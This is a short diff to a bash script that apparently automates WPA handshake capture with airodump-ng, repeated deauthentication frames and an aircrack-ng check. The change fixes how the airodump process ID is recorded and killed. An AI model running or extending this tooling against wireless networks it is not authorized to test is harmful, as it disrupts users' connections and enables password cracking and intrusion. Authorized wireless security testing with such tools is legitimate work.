@@ -95,6 +95,7 @@ get_iface(){
 }
 
 stop_monitor_mode(){
+    [ ${airodump_pid} ] && kill -15 ${airodump_pid} &>/dev/null
     iwconfig ${1} 2>/dev/null | grep -q 'Mode:Monitor'
     if [ $? -eq 0 ];then
         airmon-ng stop ${1} &>/dev/null
@@ -170,7 +171,6 @@ handshake_check(){
     echo"" | aircrack-ng -a 2 -w - -b ${ap_bssid} ${temp_dir}/handshake-01.cap \
     2>/dev/null | grep -q 'Passphrase not in dictionary'
     if [ $? -eq 0 ];then
-        kill -15 ${airodump_pid[0]}
         stop_monitor_mode ${iface}
         apbssid=$(echo ${ap_bssid} | tr ":" "-")
         cap_time=$(date '+%M%S')
@@ -248,9 +248,9 @@ wpa_attack(){
     airodump_cmd[${#airodump_cmd[@]}]=${ap_channel}
     airodump_cmd[${#airodump_cmd[@]}]=${iface}
     ${airodump_cmd[*]} &>/dev/null &
+    airodump_pid="$!"
     echo -e "${X} Start sending deauth,please waiting..."
     sleep 5
-    airodump_pid=($(ps -ef | grep '^root.*airodump-ng' | awk '{print $2}'))
     while true;do
         handshake_check && break
         send_deauth
